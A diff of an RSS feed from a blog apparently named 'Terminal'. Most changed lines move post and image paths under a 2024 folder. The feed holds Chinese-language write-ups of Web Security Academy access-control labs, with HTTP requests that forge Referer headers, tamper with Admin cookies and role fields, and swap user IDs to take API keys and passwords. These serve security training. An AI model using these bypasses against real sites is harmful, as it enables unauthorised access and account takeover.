@@ -1,11 +1,11 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Terminal</title><link>/</link><description>Recent content on Terminal</description><generator>Hugo -- gohugo.io</generator><language>en</language><lastBuildDate>Mon, 09 Dec 2024 22:32:44 +0800</lastBuildDate><atom:link href="/index.xml" rel="self" type="application/rss+xml"/><item><title>[Write Up]Lab: Referer-based access control</title><link>/posts/access-control-lab-referer-based-access-control/</link><pubDate>Mon, 09 Dec 2024 22:32:44 +0800</pubDate><guid>/posts/access-control-lab-referer-based-access-control/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
-&lt;p>&lt;img alt="Lab description" src="/img/access-control-lab-referer-based-access-control-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
-&lt;p>&lt;img alt="Lab description" src="/img/access-control-lab-referer-based-access-control-1.jpg">&lt;/p>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Terminal</title><link>/</link><description>Recent content on Terminal</description><generator>Hugo -- gohugo.io</generator><language>en</language><lastBuildDate>Mon, 09 Dec 2024 22:32:44 +0800</lastBuildDate><atom:link href="/index.xml" rel="self" type="application/rss+xml"/><item><title>[Write Up]Lab: Referer-based access control</title><link>/posts/2024/access-control-lab-referer-based-access-control/</link><pubDate>Mon, 09 Dec 2024 22:32:44 +0800</pubDate><guid>/posts/2024/access-control-lab-referer-based-access-control/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/access-control-lab-referer-based-access-control-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/access-control-lab-referer-based-access-control-1.jpg">&lt;/p>
 &lt;h2 id="solution">Solution&lt;/h2>
 &lt;ol>
 &lt;li>使用&lt;code>administrator:admin&lt;/code>登录&lt;/li>
 &lt;li>点击&lt;code>Admin panel&lt;/code>后可以看到调整用户权限的功能
-&lt;img alt="Admin panel" src="/img/access-control-lab-referer-based-access-control-2.jpg">&lt;/li>
+&lt;img alt="Admin panel" src="/img/2024/access-control-lab-referer-based-access-control-2.jpg">&lt;/li>
 &lt;li>选择&lt;code>carlos (NORMAL)&lt;/code>并点击&lt;code>Upgrade user&lt;/code>，对应请求如下
 &lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> /admin-roles?username=carlos&amp;amp;action=upgrade &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Referer&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">https://0a4e00ad04fff04884d1b0d900e400cf.web-security-academy.net/admin&lt;/span>
@@ -15,16 +15,16 @@
 &lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> /admin-roles?username=wiener&amp;amp;action=upgrade &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Referer&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">https://0a4e00ad04fff04884d1b0d900e400cf.web-security-academy.net/admin&lt;/span>
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
-&lt;/ol></content></item><item><title>[Write Up]Lab: Multi-step process with no access control on one step</title><link>/posts/access-control-lab-multi-step-process-with-no-access-control-on-one-step/</link><pubDate>Mon, 09 Dec 2024 22:12:29 +0800</pubDate><guid>/posts/access-control-lab-multi-step-process-with-no-access-control-on-one-step/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
-&lt;p>&lt;img alt="Lab description" src="/img/access-control-lab-multi-step-process-with-no-access-control-on-one-step-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
-&lt;p>&lt;img alt="Lab description" src="/img/access-control-lab-multi-step-process-with-no-access-control-on-one-step-1.jpg">&lt;/p>
+&lt;/ol></content></item><item><title>[Write Up]Lab: Multi-step process with no access control on one step</title><link>/posts/2024/access-control-lab-multi-step-process-with-no-access-control-on-one-step/</link><pubDate>Mon, 09 Dec 2024 22:12:29 +0800</pubDate><guid>/posts/2024/access-control-lab-multi-step-process-with-no-access-control-on-one-step/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/access-control-lab-multi-step-process-with-no-access-control-on-one-step-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/access-control-lab-multi-step-process-with-no-access-control-on-one-step-1.jpg">&lt;/p>
 &lt;h2 id="solution">Solution&lt;/h2>
 &lt;ol>
 &lt;li>使用&lt;code>administrator:admin&lt;/code>登录&lt;/li>
 &lt;li>点击&lt;code>Admin panel&lt;/code>后可以看到调整用户权限的功能
-&lt;img alt="Admin panel" src="/img/access-control-lab-multi-step-process-with-no-access-control-on-one-step-2.jpg">&lt;/li>
+&lt;img alt="Admin panel" src="/img/2024/access-control-lab-multi-step-process-with-no-access-control-on-one-step-2.jpg">&lt;/li>
 &lt;li>选择&lt;code>carlos (NORMAL)&lt;/code>并点击&lt;code>Upgrade user&lt;/code>，将跳转至确认页面
-&lt;img alt="Are you sure" src="/img/access-control-lab-multi-step-process-with-no-access-control-on-one-step-3.jpg">&lt;/li>
+&lt;img alt="Are you sure" src="/img/2024/access-control-lab-multi-step-process-with-no-access-control-on-one-step-3.jpg">&lt;/li>
 &lt;li>点击&lt;code>Yes&lt;/code>后，对应Request如下
 &lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /admin-roles &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
@@ -36,7 +36,7 @@
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>action=upgrade&amp;amp;confirmed=true&amp;amp;username=wiener
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
-&lt;/ol></content></item><item><title>[Write Up]Lab: Method-based access control can be circumvented</title><link>/posts/access-control-lab-method-based-access-control-can-be-circumvented/</link><pubDate>Mon, 09 Dec 2024 21:54:28 +0800</pubDate><guid>/posts/access-control-lab-method-based-access-control-can-be-circumvented/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;/ol></content></item><item><title>[Write Up]Lab: Method-based access control can be circumvented</title><link>/posts/2024/access-control-lab-method-based-access-control-can-be-circumvented/</link><pubDate>Mon, 09 Dec 2024 21:54:28 +0800</pubDate><guid>/posts/2024/access-control-lab-method-based-access-control-can-be-circumvented/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
 &lt;p>&lt;img alt="Lab description" src="/img/access-control-lab-method-based-access-control-can-be-circumvented-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
 &lt;p>&lt;img alt="Lab description" src="/img/access-control-lab-method-based-access-control-can-be-circumvented-1.jpg">&lt;/p>
 &lt;h2 id="solution">Solution&lt;/h2>
@@ -66,9 +66,9 @@
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Length&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
 &lt;li>刷新页面后即可解题&lt;/li>
-&lt;/ol></content></item><item><title>[Write Up]Lab: URL-based access control can be circumvented</title><link>/posts/access-control-lab-url-based-access-control-can-be-circumvented/</link><pubDate>Mon, 09 Dec 2024 21:33:43 +0800</pubDate><guid>/posts/access-control-lab-url-based-access-control-can-be-circumvented/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
-&lt;p>&lt;img alt="Lab description" src="/img/access-control-lab-url-based-access-control-can-be-circumvented-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
-&lt;p>&lt;img alt="Lab description" src="/img/access-control-lab-url-based-access-control-can-be-circumvented-1.jpg">&lt;/p>
+&lt;/ol></content></item><item><title>[Write Up]Lab: URL-based access control can be circumvented</title><link>/posts/2024/access-control-lab-url-based-access-control-can-be-circumvented/</link><pubDate>Mon, 09 Dec 2024 21:33:43 +0800</pubDate><guid>/posts/2024/access-control-lab-url-based-access-control-can-be-circumvented/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/access-control-lab-url-based-access-control-can-be-circumvented-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/access-control-lab-url-based-access-control-can-be-circumvented-1.jpg">&lt;/p>
 &lt;h2 id="solution">Solution&lt;/h2>
 &lt;ol>
 &lt;li>尝试点击右上角&lt;code>Admin panel&lt;/code>进行管理页面，获得以下Response
@@ -103,62 +103,62 @@
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Length&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
 &lt;li>刷新页面后即可解题&lt;/li>
-&lt;/ol></content></item><item><title>[Write Up]Lab: User ID controlled by request parameter with password disclosure</title><link>/posts/access-control-lab-user-id-controlled-by-request-parameter-with-password-disclosure/</link><pubDate>Sun, 08 Dec 2024 23:13:36 +0800</pubDate><guid>/posts/access-control-lab-user-id-controlled-by-request-parameter-with-password-disclosure/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
-&lt;p>&lt;img alt="Lab description" src="/img/access-control-lab-user-id-controlled-by-request-parameter-with-password-disclosure-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
-&lt;p>&lt;img alt="Lab description" src="/img/access-control-lab-user-id-controlled-by-request-parameter-with-password-disclosure-1.jpg">&lt;/p>
+&lt;/ol></content></item><item><title>[Write Up]Lab: User ID controlled by request parameter with password disclosure</title><link>/posts/2024/access-control-lab-user-id-controlled-by-request-parameter-with-password-disclosure/</link><pubDate>Sun, 08 Dec 2024 23:13:36 +0800</pubDate><guid>/posts/2024/access-control-lab-user-id-controlled-by-request-parameter-with-password-disclosure/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/access-control-lab-user-id-controlled-by-request-parameter-with-password-disclosure-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/access-control-lab-user-id-controlled-by-request-parameter-with-password-disclosure-1.jpg">&lt;/p>
 &lt;h2 id="solution">Solution&lt;/h2>
 &lt;ol>
 &lt;li>使用&lt;code>wiener:peter&lt;/code>进行登录&lt;/li>
 &lt;li>访问&lt;code>my-account?id=administrator&lt;/code>
-&lt;img alt="administrator" src="/img/access-control-lab-user-id-controlled-by-request-parameter-with-password-disclosure-2.jpg">&lt;/li>
+&lt;img alt="administrator" src="/img/2024/access-control-lab-user-id-controlled-by-request-parameter-with-password-disclosure-2.jpg">&lt;/li>
 &lt;li>查看Response源代码，可以获得明文密码
-&lt;img alt="administrator password" src="/img/access-control-lab-user-id-controlled-by-request-parameter-with-password-disclosure-3.jpg">&lt;/li>
+&lt;img alt="administrator password" src="/img/2024/access-control-lab-user-id-controlled-by-request-parameter-with-password-disclosure-3.jpg">&lt;/li>
 &lt;li>使用&lt;code>administrator:v02rt5a778ksnqgk70iq&lt;/code>进行登录
-&lt;img alt="administrator" src="/img/access-control-lab-user-id-controlled-by-request-parameter-with-password-disclosure-4.jpg">&lt;/li>
+&lt;img alt="administrator" src="/img/2024/access-control-lab-user-id-controlled-by-request-parameter-with-password-disclosure-4.jpg">&lt;/li>
 &lt;li>点击&lt;code>Admin panel&lt;/code>进入管理页面后，点击&lt;code>carlos - Delete&lt;/code>即可解题&lt;/li>
-&lt;/ol></content></item><item><title>[Write Up]Lab: User ID controlled by request parameter with data leakage in redirect</title><link>/posts/access-control-lab-user-id-controlled-by-request-parameter-with-data-leakage-in-redirect/</link><pubDate>Sun, 08 Dec 2024 23:02:09 +0800</pubDate><guid>/posts/access-control-lab-user-id-controlled-by-request-parameter-with-data-leakage-in-redirect/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
-&lt;p>&lt;img alt="Lab description" src="/img/access-control-lab-user-id-controlled-by-request-parameter-with-data-leakage-in-redirect-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
-&lt;p>&lt;img alt="Lab description" src="/img/access-control-lab-user-id-controlled-by-request-parameter-with-data-leakage-in-redirect-1.jpg">&lt;/p>
+&lt;/ol></content></item><item><title>[Write Up]Lab: User ID controlled by request parameter with data leakage in redirect</title><link>/posts/2024/access-control-lab-user-id-controlled-by-request-parameter-with-data-leakage-in-redirect/</link><pubDate>Sun, 08 Dec 2024 23:02:09 +0800</pubDate><guid>/posts/2024/access-control-lab-user-id-controlled-by-request-parameter-with-data-leakage-in-redirect/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/access-control-lab-user-id-controlled-by-request-parameter-with-data-leakage-in-redirect-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/access-control-lab-user-id-controlled-by-request-parameter-with-data-leakage-in-redirect-1.jpg">&lt;/p>
 &lt;h2 id="solution">Solution&lt;/h2>
 &lt;ol>
 &lt;li>使用&lt;code>wiener:peter&lt;/code>进行登录&lt;/li>
 &lt;li>将url替换为&lt;code>/my-account?id=carlos&lt;/code>会跳转回登录页面
-&lt;img alt="Login" src="/img/access-control-lab-user-id-controlled-by-request-parameter-with-data-leakage-in-redirect-2.jpg">&lt;/li>
+&lt;img alt="Login" src="/img/2024/access-control-lab-user-id-controlled-by-request-parameter-with-data-leakage-in-redirect-2.jpg">&lt;/li>
 &lt;li>观察&lt;code>/my-account?id=carlos&lt;/code>的Response
 &lt;pre tabindex="0">&lt;code>HTTP/2 302 Found
 Location: /login
-&lt;/code>&lt;/pre>&lt;img alt="Profile" src="/img/access-control-lab-user-id-controlled-by-request-parameter-with-data-leakage-in-redirect-3.jpg">&lt;/li>
+&lt;/code>&lt;/pre>&lt;img alt="Profile" src="/img/2024/access-control-lab-user-id-controlled-by-request-parameter-with-data-leakage-in-redirect-3.jpg">&lt;/li>
 &lt;li>虽然进行跳转，但Response中包含了&lt;code>API key&lt;/code>&lt;/li>
 &lt;li>点击上方&lt;code>Submit solution&lt;/code>，将&lt;code>Your API Key is&lt;/code>填入即可解题&lt;/li>
-&lt;/ol></content></item><item><title>[Write Up]Lab: User ID controlled by request parameter, with unpredictable user IDs</title><link>/posts/access-control-lab-user-id-controlled-by-request-parameter-with-unpredictable-user-ids/</link><pubDate>Sun, 08 Dec 2024 22:48:31 +0800</pubDate><guid>/posts/access-control-lab-user-id-controlled-by-request-parameter-with-unpredictable-user-ids/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
-&lt;p>&lt;img alt="Lab description" src="/img/access-control-lab-user-id-controlled-by-request-parameter-with-unpredictable-user-ids-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
-&lt;p>&lt;img alt="Lab description" src="/img/access-control-lab-user-id-controlled-by-request-parameter-with-unpredictable-user-ids-1.jpg">&lt;/p>
+&lt;/ol></content></item><item><title>[Write Up]Lab: User ID controlled by request parameter, with unpredictable user IDs</title><link>/posts/2024/access-control-lab-user-id-controlled-by-request-parameter-with-unpredictable-user-ids/</link><pubDate>Sun, 08 Dec 2024 22:48:31 +0800</pubDate><guid>/posts/2024/access-control-lab-user-id-controlled-by-request-parameter-with-unpredictable-user-ids/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/access-control-lab-user-id-controlled-by-request-parameter-with-unpredictable-user-ids-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/access-control-lab-user-id-controlled-by-request-parameter-with-unpredictable-user-ids-1.jpg">&lt;/p>
 &lt;h2 id="solution">Solution&lt;/h2>
 &lt;ol>
 &lt;li>使用&lt;code>wiener:peter&lt;/code>进行登录&lt;/li>
 &lt;li>观察&lt;code>My account&lt;/code>的url为&lt;code>/my-account?id=41c5a7f4-33c3-4f6b-927e-ac36f46c66bd&lt;/code>&lt;/li>
 &lt;li>点击&lt;code>Home&lt;/code>找到&lt;code>carlos&lt;/code>发布的文章
-&lt;img alt="Post" src="/img/access-control-lab-user-id-controlled-by-request-parameter-with-unpredictable-user-ids-2.jpg">&lt;/li>
+&lt;img alt="Post" src="/img/2024/access-control-lab-user-id-controlled-by-request-parameter-with-unpredictable-user-ids-2.jpg">&lt;/li>
 &lt;li>点击后会跳转到&lt;code>/blogs?userId=aabdb9d7-d2af-4f89-9a2f-5756fc7affd0&lt;/code>，可得知&lt;code>carlos&lt;/code>的&lt;code>id&lt;/code>为&lt;code>aabdb9d7-d2af-4f89-9a2f-5756fc7affd0&lt;/code>&lt;/li>
 &lt;li>拼接步骤2的url为&lt;code>/my-account?id=aabdb9d7-d2af-4f89-9a2f-5756fc7affd0&lt;/code>，便可跳转到&lt;code>carlos&lt;/code>的页面&lt;/li>
 &lt;li>点击上方&lt;code>Submit solution&lt;/code>，将&lt;code>Your API Key is&lt;/code>填入即可解题&lt;/li>
-&lt;/ol></content></item><item><title>[Write Up]Lab: User ID controlled by request parameter</title><link>/posts/access-control-lab-user-id-controlled-by-request-parameter/</link><pubDate>Sun, 08 Dec 2024 20:01:37 +0800</pubDate><guid>/posts/access-control-lab-user-id-controlled-by-request-parameter/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
-&lt;p>&lt;img alt="Lab description" src="/img/access-control-lab-user-id-controlled-by-request-parameter-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
-&lt;p>&lt;img alt="Lab description" src="/img/access-control-lab-user-id-controlled-by-request-parameter-1.jpg">&lt;/p>
+&lt;/ol></content></item><item><title>[Write Up]Lab: User ID controlled by request parameter</title><link>/posts/2024/access-control-lab-user-id-controlled-by-request-parameter/</link><pubDate>Sun, 08 Dec 2024 20:01:37 +0800</pubDate><guid>/posts/2024/access-control-lab-user-id-controlled-by-request-parameter/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/access-control-lab-user-id-controlled-by-request-parameter-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/access-control-lab-user-id-controlled-by-request-parameter-1.jpg">&lt;/p>
 &lt;h2 id="solution">Solution&lt;/h2>
 &lt;ol>
 &lt;li>使用&lt;code>wiener:peter&lt;/code>进行登录&lt;/li>
 &lt;li>修改url为&lt;code>/my-account?id=carlos&lt;/code>即可获得&lt;code>carlos&lt;/code>的API key
-&lt;img alt="API key" src="/img/access-control-lab-user-id-controlled-by-request-parameter-2.jpg">&lt;/li>
+&lt;img alt="API key" src="/img/2024/access-control-lab-user-id-controlled-by-request-parameter-2.jpg">&lt;/li>
 &lt;li>点击上方&lt;code>Submit solution&lt;/code>，将&lt;code>Your API Key is&lt;/code>填入即可解题&lt;/li>
-&lt;/ol></content></item><item><title>[Write Up]Lab: User role can be modified in user profile</title><link>/posts/access-control-lab-user-role-can-be-modified-in-user-profile/</link><pubDate>Sun, 08 Dec 2024 19:43:17 +0800</pubDate><guid>/posts/access-control-lab-user-role-can-be-modified-in-user-profile/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
-&lt;p>&lt;img alt="Lab description" src="/img/access-control-lab-user-role-can-be-modified-in-user-profile-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
-&lt;p>&lt;img alt="Lab description" src="/img/access-control-lab-user-role-can-be-modified-in-user-profile-1.jpg">&lt;/p>
+&lt;/ol></content></item><item><title>[Write Up]Lab: User role can be modified in user profile</title><link>/posts/2024/access-control-lab-user-role-can-be-modified-in-user-profile/</link><pubDate>Sun, 08 Dec 2024 19:43:17 +0800</pubDate><guid>/posts/2024/access-control-lab-user-role-can-be-modified-in-user-profile/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/access-control-lab-user-role-can-be-modified-in-user-profile-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/access-control-lab-user-role-can-be-modified-in-user-profile-1.jpg">&lt;/p>
 &lt;h2 id="solution">Solution&lt;/h2>
 &lt;ol>
 &lt;li>使用&lt;code>wiener:peter&lt;/code>进行登录&lt;/li>
 &lt;li>输入&lt;code>Email&lt;/code>后点击&lt;code>Update email&lt;/code>
-&lt;img alt="Update email" src="/img/access-control-lab-user-role-can-be-modified-in-user-profile-2.jpg">&lt;/li>
+&lt;img alt="Update email" src="/img/2024/access-control-lab-user-role-can-be-modified-in-user-profile-2.jpg">&lt;/li>
 &lt;li>观察对应的Request、Response&lt;/li>
 &lt;/ol>
 &lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /my-account/change-email &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
@@ -196,70 +196,67 @@ Location: /login
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="5">
 &lt;li>访问&lt;code>/admin&lt;/code>并且点击&lt;code>carlos - Delete&lt;/code>即可解题&lt;/li>
-&lt;/ol></content></item><item><title>[Write Up]Lab: User role controlled by request parameter</title><link>/posts/access-control-lab-user-role-controlled-by-request-parameter/</link><pubDate>Sun, 08 Dec 2024 19:12:29 +0800</pubDate><guid>/posts/access-control-lab-user-role-controlled-by-request-parameter/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
-&lt;p>&lt;img alt="Lab description" src="/img/access-control-lab-user-role-controlled-by-request-parameter-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
-&lt;p>&lt;img alt="Lab description" src="/img/access-control-lab-user-role-controlled-by-request-parameter-1.jpg">&lt;/p>
+&lt;/ol></content></item><item><title>[Write Up]Lab: User role controlled by request parameter</title><link>/posts/2024/access-control-lab-user-role-controlled-by-request-parameter/</link><pubDate>Sun, 08 Dec 2024 19:12:29 +0800</pubDate><guid>/posts/2024/access-control-lab-user-role-controlled-by-request-parameter/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/access-control-lab-user-role-controlled-by-request-parameter-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/access-control-lab-user-role-controlled-by-request-parameter-1.jpg">&lt;/p>
 &lt;h2 id="solution">Solution&lt;/h2>
 &lt;ol>
 &lt;li>使用&lt;code>wiener:peter&lt;/code>进行登录&lt;/li>
-&lt;li>访问&lt;code>/admin&lt;/code>后出现&lt;code>Admin interface only available if logged in as an administrator &lt;/code>，其对应Request&lt;/li>
-&lt;/ol>
+&lt;li>访问&lt;code>/admin&lt;/code>后出现&lt;code>Admin interface only available if logged in as an administrator &lt;/code>，其对应Request
 &lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> /admin &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Cookie&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">session=3KZzj5osf2p8Nuq3s0z7JVUN9e95bK95; Admin=false&lt;/span>
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="3">
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
 &lt;li>通过浏览器修改&lt;code>Cookie&lt;/code>中&lt;code>Admin&lt;/code>的值
-&lt;img alt="Cookie" src="/img/access-control-lab-user-role-controlled-by-request-parameter-1.jpg">&lt;/li>
+&lt;img alt="Cookie" src="/img/2024/access-control-lab-user-role-controlled-by-request-parameter-1.jpg">&lt;/li>
 &lt;li>刷新页面并且点击&lt;code>carlos - Delete&lt;/code>即可解题&lt;/li>
-&lt;/ol></content></item><item><title>[Write Up]Lab: Unprotected admin functionality with unpredictable URL</title><link>/posts/access-control-lab-unprotected-admin-functionality-with-unpredictable-url/</link><pubDate>Sun, 08 Dec 2024 19:03:01 +0800</pubDate><guid>/posts/access-control-lab-unprotected-admin-functionality-with-unpredictable-url/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
-&lt;p>&lt;img alt="Lab description" src="/img/access-control-lab-unprotected-admin-functionality-with-unpredictable-url-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
-&lt;p>&lt;img alt="Lab description" src="/img/access-control-lab-unprotected-admin-functionality-with-unpredictable-url-1.jpg">&lt;/p>
+&lt;/ol></content></item><item><title>[Write Up]Lab: Unprotected admin functionality with unpredictable URL</title><link>/posts/2024/access-control-lab-unprotected-admin-functionality-with-unpredictable-url/</link><pubDate>Sun, 08 Dec 2024 19:03:01 +0800</pubDate><guid>/posts/2024/access-control-lab-unprotected-admin-functionality-with-unpredictable-url/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/access-control-lab-unprotected-admin-functionality-with-unpredictable-url-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/access-control-lab-unprotected-admin-functionality-with-unpredictable-url-1.jpg">&lt;/p>
 &lt;h2 id="solution">Solution&lt;/h2>
 &lt;ol>
 &lt;li>查看Lab Response，并搜索&lt;code>admin&lt;/code>，会发现有admin管理页面
-&lt;img alt="Search result" src="/img/access-control-lab-unprotected-admin-functionality-with-unpredictable-url-2.jpg">&lt;/li>
+&lt;img alt="Search result" src="/img/2024/access-control-lab-unprotected-admin-functionality-with-unpredictable-url-2.jpg">&lt;/li>
 &lt;li>访问&lt;code>/admin-bse0oh&lt;/code>
-&lt;img alt="Search result" src="/img/access-control-lab-unprotected-admin-functionality-with-unpredictable-url-3.jpg">&lt;/li>
+&lt;img alt="Search result" src="/img/2024/access-control-lab-unprotected-admin-functionality-with-unpredictable-url-3.jpg">&lt;/li>
 &lt;li>点击&lt;code>carlos - Delete&lt;/code>即可解题&lt;/li>
-&lt;/ol></content></item><item><title>[Write Up]Lab: Unprotected admin functionality</title><link>/posts/access-control-lab-unprotected-admin-functionality/</link><pubDate>Sun, 08 Dec 2024 18:45:41 +0800</pubDate><guid>/posts/access-control-lab-unprotected-admin-functionality/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
-&lt;p>&lt;img alt="Lab description" src="/img/access-control-lab-unprotected-admin-functionality-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
-&lt;p>&lt;img alt="Lab description" src="/img/access-control-lab-unprotected-admin-functionality-1.jpg">&lt;/p>
+&lt;/ol></content></item><item><title>[Write Up]Lab: Unprotected admin functionality</title><link>/posts/2024/access-control-lab-unprotected-admin-functionality/</link><pubDate>Sun, 08 Dec 2024 18:45:41 +0800</pubDate><guid>/posts/2024/access-control-lab-unprotected-admin-functionality/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/access-control-lab-unprotected-admin-functionality-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
